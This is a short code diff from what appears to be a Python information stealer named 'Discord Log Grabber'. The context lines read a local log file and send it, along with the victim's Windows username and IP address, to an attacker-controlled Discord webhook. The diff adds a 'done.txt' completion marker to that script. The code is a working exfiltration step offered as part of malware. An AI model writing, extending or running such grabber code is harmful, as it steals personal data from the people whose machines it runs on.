@@ -21,3 +21,5 @@ with open(file='log.txt', mode='rb') as f:
     discord_file = discord.File(f)
 
 webhook.send('Username: ' + os.getenv("UserName") + '\n' + "ip: " + GetIP() + '\n', username='Discord Log Grabber', avatar_url='https://i.ibb.co/c3P5DbN/Gigachad.png', file=discord_file)
+f= open("done.txt","w+")
+f.close()
